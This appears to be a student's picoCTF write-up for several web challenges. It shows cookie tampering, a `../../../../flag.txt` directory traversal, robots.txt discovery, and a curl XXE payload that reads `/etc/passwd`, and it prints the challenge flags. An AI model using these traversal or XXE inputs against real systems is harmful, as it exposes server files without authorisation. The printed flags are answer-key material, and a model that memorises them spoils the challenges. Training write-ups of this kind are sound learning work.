Approach:

This challenge was pretty easy, it just required for us to tinker with the cookie values of the webpage, seeing the title of the challenge and webpage i knew we had to do something with the cookies so i accessed them by going to inspect, application and then cookies there i saw the value as -1 and thought to change it which resulted in a new webpage so i kept on doing this till i entered the value 18 which gave me the flag!!!

# Forbidden Paths

**Flag:** `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`

Approach:

- **Step 1**

On launching the challenge i got a basic undertsanding of the challenge, we need to somehow enter a path in the website that could bypass the filtering of absolute path and since we cant provide a absolute path i had to do something different, so i used chatGPT to get basic ideas of how we can bypass filters like this and one method suggested was to append `../../` before `/flag.txt` to bypass the filter this is known as directory traversal. This works because basically what we are doing is moving up the directories till we reach the root directory and then we provide the relative path from there to `/flag.txt` so i just kept appending `../` till i entered `../../../../flag.txt` which worked and it gave me the flag!!!

Knowledge Gained:

1. Directory Traversal in websites
2. Basic idea on how to bypass absolute path filters

Incorrect Methods:

- Initially i tried various methods to bypass the filter like using `.`, using globs etc. which did not work so i used help of AI to get a basic idea of what to do

# Insp3ct0r

**Flag:** `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}`

Started the challenge, opened the website and inspected the site there i looked around to find all the 3 parts of the flag and complete it!!!

# where are the robots

**Flag:** `picoCTF{ca1cu1at1ng_Mach1n3s_8028f}`

Started the challenge, opened the site and i tried using inspect to find any leads but got no success then i asked chatGPT for some ideas on what to do and it told me to try using "robots.txt" which tells search engine crawlers which URLs the crawler can access on the site, on using this i see 
```
User-agent: *
Disallow: /8028f.html
```
so i try to go to the dissallowed file by appending it to the url and voila i get the flag!!!

# SOAP

**Flag:**  `picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}`

One of the harder challenges to solve but finally did it. So first i opened the site and was stuck there for a quite a while until while just looking around in inspect i saw that in Network there was a "POST" request which gave me an idea since i had already solved a similar challenge in OASIS so i knew i had to use the `curl` command to send a special request to get the flag, so i copied the request as `curl` and got this 

```
curl 'http://saturn.picoctf.net:52083/data' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,hi;q=0.8' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/xml' \
  -H 'Origin: http://saturn.picoctf.net:52083' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://saturn.picoctf.net:52083/' \

  --data-raw '<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>' \
  --insecure
```

here it was clear an xml request was being sent and also the hint said to use an xml external entity injection so i googled it and found the format of an XXE attack using which then i modified the command and got this

```
curl 'http://saturn.picoctf.net:52083/data' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,hi;q=0.8' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/xml' \
  -H 'Origin: http://saturn.picoctf.net:52083' \

  --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>' \
  --insecure
```

on running this i got the flag!!!
